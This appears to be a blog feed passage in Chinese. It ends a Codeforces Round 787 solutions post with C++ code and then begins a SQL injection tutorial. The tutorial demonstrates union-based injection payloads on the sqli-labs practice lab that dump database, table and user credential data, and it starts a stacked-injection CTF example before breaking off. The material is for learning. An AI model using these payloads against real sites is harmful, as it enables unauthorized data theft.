class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">200005</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,x;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;x;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> max_x=a[<span class="number">1</span>],min_x=a[<span class="number">1</span>],ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        ans+=<span class="built_in">abs</span>(a[i]-a[i<span class="number">-1</span>]);</span><br><span class="line">        max_x=<span class="built_in">max</span>(max_x,a[i]);</span><br><span class="line">        min_x=<span class="built_in">min</span>(min_x,a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    ans+=<span class="built_in">min</span>((min_x<span class="number">-1</span>)*<span class="number">2</span>,<span class="built_in">min</span>(<span class="built_in">abs</span>(a[<span class="number">1</span>]<span class="number">-1</span>),<span class="built_in">abs</span>(a[n]<span class="number">-1</span>)));</span><br><span class="line">    <span class="keyword">if</span>(x&gt;max_x)&#123;</span><br><span class="line">        ans+=<span class="built_in">min</span>((x-max_x)*<span class="number">2</span>,<span class="built_in">min</span>(<span class="built_in">abs</span>(x-a[<span class="number">1</span>]),<span class="built_in">abs</span>(x-a[n])));</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;ans&lt;&lt;endl;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="E-Replace-With-the-Previous-Minimize"><a href="#E-Replace-With-the-Previous-Minimize" class="headerlink" title="E. Replace With the Previous, Minimize"></a>E. Replace With the Previous, Minimize</h2><h3 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/05/06/Codeforces%20Round%20787(Div.3)/5.png" alt="5"></p><h3 id="题目分析-4"><a href="#题目分析-4" class="headerlink" title="题目分析"></a>题目分析</h3><p>这题有点小意思，意思就是一次操作能把一个字符串的所有特定字符变小 <code>1</code>，问你 <code>k</code> 次操作生成的字典序最小的字符串是什么。首先有一点肯定没错，就是我无脑把前面不是 <code>a</code> 的字符先都变 <code>a</code> 了肯定不会有问题。但是有一点需要考虑，那就是先变前面，如果后面还有比这个大一点的，那就又需要很多次才能变成 <code>a</code> 了，所以我们的思路就是收集所有能在 <code>k</code> 次范围内变成 <code>a</code> 的字符，从左到右遍历，显而易见，k&gt;=25则一定可以达到全 <code>a</code> 的状态。遇到了不能在 <code>k</code> 次变成 <code>a</code> 的字符之后，把前面取得的最大次数先用掉，如果次数有剩余，无脑给那一个字符即可。</p><h3 id="标程-4"><a href="#标程-4" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxx 40005</span></span><br><span class="line"><span class="comment">//#define int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK &#123;puts(<span class="meta-string">&quot;YES&quot;</span>);&#125;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NO &#123;puts(<span class="meta-string">&quot;NO&quot;</span>);return;&#125;</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="keyword">int</span> n,k;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">change</span><span class="params">(<span class="keyword">char</span> ch)</span></span>&#123;</span><br><span class="line">    <span class="comment">//putchar(ch);putchar(10);</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(s[i]==ch)s[i]--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//printf(&quot;%s\n&quot;,s);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    cin&gt;&gt;n&gt;&gt;k;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,s);</span><br><span class="line">    <span class="keyword">if</span>(k&gt;=<span class="number">25</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">            <span class="built_in">putchar</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> q=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> flag=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(s[i]-<span class="string">&#x27;a&#x27;</span>&gt;k)&#123;</span><br><span class="line">            <span class="keyword">int</span> th=k-q;</span><br><span class="line">            <span class="keyword">char</span> cc=s[i];</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;th;j++)&#123;</span><br><span class="line">                <span class="comment">//printf(&quot;%d &quot;,j);</span></span><br><span class="line">                <span class="comment">//putchar(cc-j);</span></span><br><span class="line">                <span class="built_in">change</span>(cc-j);</span><br><span class="line">                <span class="comment">//putchar(s[i]-j);putchar(10);</span></span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=q;j&gt;=<span class="number">1</span>;j--)&#123;</span><br><span class="line">                <span class="built_in">change</span>(<span class="string">&#x27;a&#x27;</span>+j);</span><br><span class="line">            &#125;</span><br><span class="line">            flag=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        q=<span class="built_in">max</span>(q,s[i]-<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">        <span class="comment">//printf(&quot;%d\n&quot;,q);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(flag)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">            <span class="built_in">putchar</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,s);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在 rating 还没出来，不知道能不能蓝，不过我知道如果 A 不失误是一定有机会蓝名的，下次再接再厉吧。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://codeforces.com/contest/1675&quot;&gt;Codeforces Round #787 (Div. 3)&lt;/a&gt; 题解来了。&lt;/p&gt;
&lt;p&gt;实况在&lt;a href=&quot;https://www.bilibili.com/video/bv1eF411j7Uz&quot;&gt;这里&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="icpc" scheme="http://example.com/categories/icpc/"/>
    
    <category term="codeforces" scheme="http://example.com/categories/icpc/codeforces/"/>
    
    <category term="题解" scheme="http://example.com/categories/icpc/codeforces/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
  <entry>
    <title>sql注入总结</title>
    <link href="http://example.com/2022/05/04/sql%E6%B3%A8%E5%85%A5/"/>
    <id>http://example.com/2022/05/04/sql%E6%B3%A8%E5%85%A5/</id>
    <published>2022-05-03T16:00:00.000Z</published>
    <updated>2022-05-09T03:39:26.216Z</updated>
    
    <content type="html"><![CDATA[<p>sql学了也有一段时间了，想着把能用到的知识点都写一遍好。</p><span id="more"></span><p>先瞎jb扯几句</p><h2 id="WEB框架"><a href="#WEB框架" class="headerlink" title="WEB框架"></a>WEB框架</h2><p><code>web</code>应用一改我们平时常见的 <code>p2p</code> 和 <code>C/S</code> 模式，采用 <code>B/S</code> 模式。随着网络技术的发展，特别随着Web技术的不断成熟，B/S 这种软件体系结构出现了。<strong>浏览器-服务器（Browser/Server）结构</strong>，简称 <code>B/S</code> 结构，与 <code>C/S</code>不同，其客户端不需要安装专门的软件，只需要浏览器即可，浏览器与Web服务器交互，Web服务器与后端数据库进行交互，可以方便地在不同平台下工作。</p><p>比如我们玩的英雄联盟就是典型的 <code>C/S</code> 结构的服务，因为有大量图片资源和 <code>3D</code> 模型存储在本地，因此提前安装好客户端就可以方便地与服务器进行交互，如果采用 <code>B/S</code> 结构的话，在我们游戏开始的时候就要与服务器建立连接，下载好各种资源到本地，然后再与服务器进行交互，各种页游均是 <code>B/S</code> 结构。<code>B/S</code> 的优势就是对需要服务一方的电脑要求较低，很容易可以兼容系统上的差异，客户往往只需要安装浏览器便可以享受全部的  <code>web</code> 服务。<code>web</code> 应用会先向我们的浏览器发送前端语言 <code>javascript</code> 或者 <code>html</code> 给浏览器解析执行，我们经过一定的操作之后会向服务器发送请求，然后服务器根据我们的请求做出不同的答复，这个答复还是前端语言形成的网页。</p><p>服务器会根据什么规则去响应请求，这个就要用到后端语言了，如 <code>php</code>,<code>aspx</code> 等都是常见的后端语言，现在以 <code>php</code> 为主。比如我们实现一个登录页面，那么这个登录肯定是会用到数据库查询操作的，我们将请求提交给服务器之后，后端语言得到我们发送的数据，然后后端语言就会相应地构造 <code>sql</code> 语句去执行数据库查询，并根据查询结果来响应我们</p><p>那么我们很清晰了，我们负责发送数据，<code>php</code> 构造 <code>sql</code> 语句去查询。首先明白一点，<code>sql</code> 语句肯定我们能控制，因为我输入什么它就要去查什么。我们的输入一定会被嵌入 <code>sql</code> 语句。如果我们在 <code>sql</code> 中能输入任意内容，那我就相当于直接控制了整个数据库。<code>sql</code> 注入的就这么产生了，带来的本质危害也就是数据库信息泄露，如果数据库配置权限过高甚至能让攻击者拿到 <code>shell</code>。</p><h2 id="sql语言"><a href="#sql语言" class="headerlink" title="sql语言"></a>sql语言</h2><p><code>SQL</code>(<code>Structured Query Language</code>，结构化查询语言)是一种特定目的程式语言，用于管理关系数据库管理系统（<code>RDBMS</code>），或在关系流数据管理系统（<code>RDSMS</code>）中进行流处理。<br><code>SQL</code>基于关系代数和元组关系演算，包括一个数据定义语言和数据操纵语言。<code>SQL</code>的范围包括数据插入、查询、更新和删除，数据库模式创建和修改，以及数据访问控制。尽管<code>SQL</code>经常被描述为，而且很大程度上是一种声明式编程（<code>4GL</code>），但是其也含有过程式编程的元素。(from wiki)</p><p>我们最常用的数据库系统是<code>mysql</code>。</p><h2 id="Mysql常用函数"><a href="#Mysql常用函数" class="headerlink" title="Mysql常用函数"></a>Mysql常用函数</h2><h3 id="数据库基本信息函数"><a href="#数据库基本信息函数" class="headerlink" title="数据库基本信息函数"></a>数据库基本信息函数</h3><table><thead><tr><th>函数名</th><th>功能</th></tr></thead><tbody><tr><td>user()</td><td>用户名</td></tr><tr><td>system_user()</td><td>系统用户名</td></tr><tr><td>curent_user()</td><td>前用户名</td></tr><tr><td>session_user()</td><td>连接数据库的用户名</td></tr><tr><td>database()</td><td>当前选择的数据库</td></tr><tr><td>version()</td><td>数据库版本</td></tr><tr><td>@@data_dir()</td><td>数据库路径</td></tr><tr><td>@@base_dir()</td><td>数据库安装路径</td></tr><tr><td>@@version_compile_os</td><td>操作系统</td></tr></tbody></table><p>注意，这些函数都无参数且在使用时必须使用 <code>select</code> 关键字输出。</p><h3 id="字符串处理函数"><a href="#字符串处理函数" class="headerlink" title="字符串处理函数"></a>字符串处理函数</h3><p>在sql中，字符串通常使用一对单引号表示。</p><table><thead><tr><th>函数名</th><th>功能</th></tr></thead><tbody><tr><td>concat(s1,s2,s3…)</td><td>无任何分隔地连接字符串</td></tr><tr><td>concat_ws(char,s1,s2,s3…)</td><td>有分隔地连接字符串</td></tr><tr><td>group_concat(s1)</td><td>连接s1列的所有记录并逗号分隔</td></tr><tr><td>load_file(file)</td><td>读取文件</td></tr><tr><td>into outfile ‘file’</td><td>写文件</td></tr><tr><td>ascii(str)</td><td>字符串的ASCII码值</td></tr><tr><td>ord(str)</td><td>返回字符串第一个字符的ASCI值</td></tr><tr><td>mid(str,start,length)</td><td>返回一个字符串的一部分</td></tr><tr><td>substr(str,start,length)</td><td>返回一个字符串的一部分</td></tr><tr><td>length(str)</td><td>返回字符串长度</td></tr><tr><td>left(str,length)</td><td>返回字符串的前缀</td></tr><tr><td>rigth(str,length)</td><td>返回字符串的后缀</td></tr></tbody></table><h3 id="sql注入常用函数"><a href="#sql注入常用函数" class="headerlink" title="sql注入常用函数"></a>sql注入常用函数</h3><table><thead><tr><th>函数名</th><th>功能</th></tr></thead><tbody><tr><td>extractvalue(xml,Xpath)</td><td>使用 XPathtable 示法从 XML 字符串中提取值</td></tr><tr><td>UpdateXML(xml,Xpath,replacement)</td><td>返回替换的 XML 片段</td></tr><tr><td>sleep(sec)</td><td>程序休眠对应秒数</td></tr><tr><td>if(expression,truepart,falsepart)</td><td>如果表达式为真返回第二个参数，否则返回第三个参数</td></tr><tr><td>char()</td><td>返回整数ASCII代码字符组成的字符串</td></tr><tr><td>strcmp(str1,str2)</td><td>比较两个字符串str1&gt;str2返回1，相等返回0，否则返回-1</td></tr><tr><td>IFNULL(arg1,arg2)</td><td>参数1不为NULL返回参数1，否则返回参数2</td></tr><tr><td>exp(pow)</td><td>返回e的指数幂</td></tr></tbody></table><h2 id="Mysql内置数据库"><a href="#Mysql内置数据库" class="headerlink" title="Mysql内置数据库"></a>Mysql内置数据库</h2><ul><li><code>Mysql</code>：保存账户信息，权限信息，存储过程，event，时区等信息</li><li><code>sys</code>：包含了一系列的存储过程、自定义函数以及视图来帮助我们快速的了解系统的元数据信息。（元数据是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限等）</li><li><code>performance_schema</code>：用于收集数据库服务器性能参数</li><li><code>information_schema</code>：它提供了访问数据库元数据的方式。其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表的数据类型与访问权限等。</li></ul><p>这里看似很复杂，实际上你只需要知道这个 <code>performance_schema</code> 数据库就可以了。对于一个未知的数据库，我们首先需要知道它的数据库名，数据表名，知道表名之后还得知道字段名，这样我们才能使用类似这样的 <code>sql</code> 语句 <code>select 字段名 from  数据库.表名;</code> 去泄露数据库的具体信息。</p><p>我们 <code>navicat</code> 打开这个数据库观察一下有什么表</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/1.png" alt="1"> </p><p>看着很多，其实我们只需要关心三个表：<code>schemata</code>，<code>tables</code>，<code>columns</code>，它们分别能爆出数据库名，表名和字段名。</p><p>我们先看看第一个表 <code>schemata</code> 的具体信息：</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/2.png" alt="2"></p><p>可以看到里面的<code>schema_name</code> 字段的值就是我们当前这个数据库系统中所有的数据库的名字，从左边也可以一一对应看到对应的数据库。</p><p>然后看看第二个表 <code>tables</code> 的信息。因为有点多我们看主要的：</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/3.png" alt="3"></p><p>可以看到里面有一个 <code>table_name</code> 字段就是整个数据库系统的所有表名，然后前面的 <code>table_schema</code> 就是这个表对应的数据库名。这里也可以看到我们这个数据库能从中找到 <code>tables</code> 和 <code>schemata</code> 这两个表名，以及其它乱七八糟的在上一张图也都有显示。</p><h2 id="获得数据库信息的其它方式"><a href="#获得数据库信息的其它方式" class="headerlink" title="获得数据库信息的其它方式"></a>获得数据库信息的其它方式</h2><p>在我们有一个 <code>mysql</code> 连接的情况下，我们想查看所有的数据库很简单，一句 <code>show databases;</code> 即可解决，但是通常情况下我们这样子输入并不能很好的回显，如果把数据库名作为一条记录输出出来那处理起来会好很多。</p><p>我们想查看数据库还可以用这种方式：</p><p><code>select schema_name from information_schema.schemata;</code></p><p>我们对比一下两个指令的结果</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/4.png" alt="4"></p><p>可以看到结果基本就是一样的。然后我们想查看比如说 <code>world</code> 数据库的表名，我们一般先 <code>use world</code> 再 <code>show tables</code> 或者一句话 <code>show tables from world;</code> 直接输出表名，但是有 <code>information_schema</code> 这个数据库，我们就能通过这里把信息显示出来。</p><p><code>select table_name from information_schema.tables where table_schema=&#39;world&#39;;</code></p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/5.png" alt="5"></p><p>可以看到结果也是一模一样的。</p><p>剩下的爆字段就不演示了，同理的。</p><p><code>select column_name from information_schema.columns where table_name=&#39;city&#39;;</code></p><p>以上的 <code>payload</code> 可以直接在注入的地方加进去，只需要改一下表名和数据库名即可。</p><h2 id="sqli-labs环境搭建"><a href="#sqli-labs环境搭建" class="headerlink" title="sqli-labs环境搭建"></a>sqli-labs环境搭建</h2><p>主要学习的环境还是用的 <a href="https://github.com/Audi-1/sqli-labs">sqli-labs</a> ，我是直接在主机上搭建，因为修改代码起来十分方便，一改就能见到效果。但是这么做确保切断了对外界的网络连接，或者心大一点就算了，想着没人会对自己的主机发起进攻的。</p><p>然后自己再搭建一个 <code>web</code> 服务，能访问就算成功了。</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/6.png" alt="6"></p><p>在使用之前在 <code>sqli-labs\sql-connections\</code> 目录下的 <code>db-creds.inc</code> 中配置一下自己的用户名和密码，再点击 <code>setup</code> 把数据库先配置好，如果一切OK，那么进入第一关的效果应该是这样的：</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/7.png" alt="7"></p><h2 id="sql注入详解"><a href="#sql注入详解" class="headerlink" title="sql注入详解"></a>sql注入详解</h2><p>在对一个 <code>ctf</code> 打 <code>sql</code> 注入的时候，我们第一步就是要寻找<strong>注入点</strong>。怎么寻找注入点呢，因为后端源码我们都是不知道的，所以我们只能通过抓包的方式观察所有能<strong>提交的参数</strong>进行 <code>sql</code> 注入的测试。</p><p>找到注入点之后我们还需要判断注入的类型。大体的注入分两类，一类是<strong>有回显的注入</strong>，另一类是<strong>没有回显的注入</strong>。一般情况下我们优先考虑有回显的注入，因为时间成本比较低，那么我们先来看看有回显的注入吧。</p><h3 id="有回显的注入"><a href="#有回显的注入" class="headerlink" title="有回显的注入"></a>有回显的注入</h3><p>什么叫有回显？查询到的数据库信息会<strong>直接显示</strong>出来，你能看到的就叫有回显，反之则是没有回显。有回显的注入有以下类型：</p><ol><li>联合查询的注入：通过union关键字泄露数据库信息</li><li>堆叠注入：通过重新执行一个 <code>sql</code> 语句的方式泄露数据库信息，或者直接增删改查数据库。</li><li>报错注入：通过一些特殊的函数报错把信息显示出来。</li><li>二次注入：咕咕咕</li></ol><h4 id="联合查询的注入"><a href="#联合查询的注入" class="headerlink" title="联合查询的注入"></a>联合查询的注入</h4><p>利用要求：有回显</p><p>假如你是 <code>admin</code> 登录之后，它页面可能会显示 <code>hello,admin</code>。那么这个 <code>hello</code> 后面就是一个回显的点，这里就可以用来泄露其它信息。这里需要怎么理解呢，假如它在登录的逻辑是这样写的：</p><p><code>select username,passowrd from data.user where username=&#39;$input_username&#39; and password=&#39;$input_password&#39;;</code><br>然后我们判断你的账号密码是否正确就主要看它是否能查找到记录，如果找到，那么我选取这条记录的第一个记录的 <code>username</code> 字段，然后输出这个，就达到了它成功登录了什么账号，我输出那个账号的目的了。</p><p>至于上面为什么说是第一条记录呢，这里你需要这么看：<code>select</code> 的返回结果可能有很多，而不管它返回了一条还是多条它都是一个数据集，是个二维的表。因此选择第一条记录是开发人员默认会加上的，此时我只需使得前面的语句查询失败（返回空数据集）并选取其它内容用 <code>union</code> 合并这个数据集，并把这里的其它内容替换成我想知道的内容，比如它的数据库名，表名，然后它这里就会原样输出这些信息了，我们就知道了。这里需要知道 <code>union</code> 是合并两个数据集的，因此两个数据集的宽度（字段数）必须一样，数据类型可以不一样，返回 <code>php</code> 处理之后都会变成字符串类型其实。</p><p>这里我们拿刚刚搭建的环境的第一关来做测试：</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/7.png" alt="7"></p><p>这里我们不需要寻找测试点了，它这里已经贴心地提醒我们用 <code>get</code> 传一个 <code>id</code> 参数进去了，因此我们先试 <code>1</code>。</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/8.png" alt="8"></p><p>可以看到我输入一个 <code>1</code> 它直接贴心的告诉了我们账号和密码是什么，这里显示的账号和密码就是回显的点。</p><p>我们再测试这个参数是否能注入，最简单最直接的方法就是打个单引号或者双引号进去。</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/9.png" alt="10"></p><p>可以发现数据库报错，那就说明这个参数是可以注入的。</p><p>因此我们用刚刚提到的方法，先另前一个语句查询失败（空数据集），然后再 <code>union</code> 上一个数据集，这个数据集是我们任何我们想泄露的信息，首先我们假装对数据库一无所知，我们第一步就是要知道这里有多少数据库，分别什么名字。</p><p>根据报错信息可以略微猜测一下它的写法 <code>select username,password from xxx.yyy where id=&#39;$input_id&#39; limit 0,1</code></p><p>我们先用引号闭合前面的参数，然后后面加上一个 <code>and 1=0</code> 让前面的数据集必为空，然后再 <code>union select 1,2--+</code> ，这里需要测试参数的个数，因为你不知道前面有几个字段，不过这里可以姑且先猜个 <code>2</code>，因为目前看来就找了账号和密码嘛，最后用 <code>--+</code> 去注释后面的单引号。结果发现数据库报了这个错误：<code>The used SELECT statements have a different number of columns</code>，这个也不难看出来是因为 <code>union</code> 前后的数据集含有不同的列数，也就是字段数不一样，所以这里不是两个，那我们换成 <code>3</code> 个参数再看看，如果不行就接着换，知道不报这个错误为止。</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/10.png" alt="11"></p><p>这里可以看到结果出来了，那么前面是有三列的，并且账号在第二列，密码在第三列，第一列大概率是这个 <code>id</code> 了。那么我们就朝着这几个回显的地方去改参数，比如我想知道数据库名，就用前面的方法。但是这里需要知道一点，那就是回显的地方这里只能存在一条记录，如果存在多条记录将报错。也就是说我可以把 <code>2</code> 替换成 <code>select xxx from zzzx.yyy</code> 但是必须保证结果集只能含有一条记录一个字段，否则会报错。一个字段没有问题，但是一条记录的话，你会想到 <code>limit</code>，可以，但是太慢了，如果数据记录很多一条一条打要累死人，这里我们用到之前讲过的聚合函数 <code>group_concat</code>，聚合函数会把所有记录整合成一条记录，并且我们还能一次输出多条记录的信息，那简直一举多得了。</p><p>我们开始报数据库名吧 <code>select schema_name from information_schema.schemata</code></p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/11.png" alt="12"></p><p>可以看到我们爆出了当前数据库名和所有数据库名，这里需要注意，我们在替换为语句的时候，语句一定要加上括号，不然它的 <code>sql</code> 会分析失败。</p><p>然后我们爆一下 <code>security</code> 数据库的信息，先爆表名，其实只需要替换一下就可以了：<code>select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;</code></p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/12.png" alt="13"></p><p>我们主要收集一下用户信息吧，所以看看 <code>users</code> 数据表的内容，我们先获取字段名，一样一样地往上套就完事了：<code>select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;</code></p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/13.png" alt="13"></p><p>然后我们这里我们就看到了所有的字段名，我们这里点到为止，把所有用户名和密码爆出来就结束吧。</p><p><code>select group_concat(username) from security.users</code> 和 <code>select group_concat(password) from security.users</code></p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/14.png" alt="14"></p><p>好，到这里我们就把数据库的信息成功获取到了。</p><h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>我们可以看到联合查询注入十分方便，几步到位可以把数据库全部泄露出来，但是利用条件一般比较苛刻，需要有回显点才能实现。</p><h4 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h4><p>堆叠注入的原理就是使用引号隔开前一个查询语句，再自己书写另外的 <code>sql</code> 语句以此达到任意执行 <code>sql</code> 语句的目的。由于结果很难回显，我们一般这个用的不多，因为我们主要还是获取信息为主，而不是要去修改它的数据库。</p><p>这个演示我们用 <code>buuctf</code> 里面的一道题吧，是来自2019强网杯的一道题目。</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/15.png" alt="15"></p><p>先不管它怎么说，有提交窗口先正常提交看看它原本的业务逻辑。</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/16.png" alt="16"></p><p>看这个输出格式，应该也是从数据库里按照一个应该是 <code>id</code> 字段查询，查询结果为两个字段，然后用 <code>var_dump</code> 输出第一条记录的信息，然后按照国际惯例加个分号看它是否报错。</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/17.png" alt="17"></p><p>报错了说明有注入点。</p><p>我们当然还是先试试联合查询注入，用 <code>1&#39; union select 1,2--+</code>，然后我们看到它回显了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> preg_match(<span class="string">&quot;/select|update|delete|drop|insert|where|\./i&quot;</span>,<span class="variable">$inject</span>);</span><br></pre></td></tr></table></figure><p>它过滤了很多关键字导致我们没办法直接使用联合查询注入，并且正则后面的 <code>/i</code> 